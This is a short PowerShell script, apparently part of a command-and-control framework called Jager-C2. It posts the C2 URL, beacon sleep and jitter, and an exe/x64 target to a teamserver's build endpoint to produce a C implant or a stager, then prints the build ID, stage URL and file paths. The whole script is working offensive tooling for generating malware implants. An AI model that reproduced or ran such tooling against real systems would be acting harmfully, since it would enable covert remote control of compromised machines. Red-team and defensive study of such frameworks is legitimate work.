param(
    [Parameter(Mandatory = $true)]
    [string]$C2URL,

    [string]$Teamserver = "http://127.0.0.1:31338",
    [switch]$Pipeline,
    [int]$Sleep = 60,
    [int]$Jitter = 20
)

Write-Host "[*] Requesting payload from Jager-C2 teamserver (C implant)" -ForegroundColor Cyan
Write-Host "    C2 URL:      $C2URL"
Write-Host "    Teamserver:  $Teamserver"
Write-Host ""

$endpoint = if ($Pipeline) { "/mgmt/build/pipeline" } else { "/mgmt/build/implant" }
$body = @{
    c2_url  = $C2URL
    sleep   = $Sleep
    jitter  = $Jitter
    format  = "exe"
    arch    = "x64"
} | ConvertTo-Json

try {
    $resp = Invoke-RestMethod -Uri "$Teamserver$endpoint" -Method Post -Body $body -ContentType "application/json"
} catch {
    Write-Host "[-] Teamserver build failed: $_" -ForegroundColor Red
    exit 1
}

if (-not $resp.success) {
    Write-Host "[-] Build failed: $($resp.error)" -ForegroundColor Red
    exit 1
}

Write-Host "[+] Build ID: $($resp.build_id)" -ForegroundColor Green
Write-Host "[+] Stage URL: $($resp.stage_url)"
if ($resp.implant.path) {
    Write-Host "[+] Implant: $($resp.implant.path)"
}
if ($resp.stager.path) {
    Write-Host "[+] Stager: $($resp.stager.path)"
}
